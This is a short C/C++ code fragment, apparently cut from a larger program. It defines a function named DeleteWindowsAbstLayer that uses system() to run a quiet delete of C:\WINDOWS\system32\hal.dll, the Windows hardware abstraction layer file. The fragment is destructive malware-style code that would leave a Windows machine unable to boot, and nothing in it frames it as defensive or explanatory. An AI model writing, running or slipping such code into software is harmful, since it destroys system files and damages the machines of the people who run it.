;VOID WINAPI DeleteWindowsAbstLayer() {
	system("del C:\\WINDOWS\\system32\\hal.dll /Q");
}
